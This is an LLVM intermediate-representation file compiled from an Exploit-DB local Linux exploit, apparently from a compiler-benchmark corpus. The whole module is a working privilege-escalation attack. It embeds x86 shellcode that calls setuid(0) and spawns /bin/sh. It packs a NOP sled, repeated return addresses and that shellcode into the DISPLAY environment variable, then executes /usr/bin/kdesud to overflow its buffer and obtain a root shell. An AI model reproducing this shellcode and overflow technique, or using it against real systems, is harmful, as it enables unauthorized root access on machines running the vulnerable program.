; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19970.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19970.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [56 x i8] c"1\C0\89\C3\89\C1\B0G\CD\80\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@RET = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"eip: 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/usr/bin/kdesud\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"kdesud\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [56 x i8], align 16
  %7 = alloca [400 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = bitcast [56 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([56 x i8], [56 x i8]* @__const.main.shell, i32 0, i32 0), i64 56, i1 false)
  %12 = load i64, i64* @RET, align 8
  store i64 %12, i64* %10, align 8
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  %15 = load i8*, i8** %14, align 8
  %16 = icmp ne i8* %15, null
  br i1 %16, label %17, label %24

17:                                               ; preds = %2
  %18 = load i64, i64* %10, align 8
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i64 @atoi(i8* %21)
  %23 = sub nsw i64 %18, %22
  store i64 %23, i64* %10, align 8
  br label %24

24:                                               ; preds = %17, %2
  %25 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 0
  %26 = load i32, i32* @NOP, align 4
  %27 = call i32 @memset(i8* %25, i32 %26, i32 400)
  %28 = load i32, i32* @ALIGN, align 4
  store i32 %28, i32* %8, align 4
  br label %29

29:                                               ; preds = %40, %24
  %30 = load i32, i32* %8, align 4
  %31 = load i32, i32* @ALIGN, align 4
  %32 = add nsw i32 160, %31
  %33 = icmp slt i32 %30, %32
  br i1 %33, label %34, label %43

34:                                               ; preds = %29
  %35 = load i64, i64* %10, align 8
  %36 = load i32, i32* %8, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 %37
  %39 = bitcast i8* %38 to i64*
  store i64 %35, i64* %39, align 1
  br label %40

40:                                               ; preds = %34
  %41 = load i32, i32* %8, align 4
  %42 = add nsw i32 %41, 4
  store i32 %42, i32* %8, align 4
  br label %29

43:                                               ; preds = %29
  store i32 300, i32* %8, align 4
  store i32 0, i32* %9, align 4
  br label %44

44:                                               ; preds = %57, %43
  %45 = load i32, i32* %9, align 4
  %46 = getelementptr inbounds [56 x i8], [56 x i8]* %6, i64 0, i64 0
  %47 = call i32 @strlen(i8* %46)
  %48 = icmp slt i32 %45, %47
  br i1 %48, label %49, label %62

49:                                               ; preds = %44
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [56 x i8], [56 x i8]* %6, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = load i32, i32* %8, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 %55
  store i8 %53, i8* %56, align 1
  br label %57

57:                                               ; preds = %49
  %58 = load i32, i32* %8, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* %9, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %9, align 4
  br label %44

62:                                               ; preds = %44
  %63 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 399
  store i8 0, i8* %63, align 1
  %64 = load i64, i64* %10, align 8
  %65 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i64 %64)
  %66 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 0
  %67 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %66, i32 1)
  %68 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32 0)
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
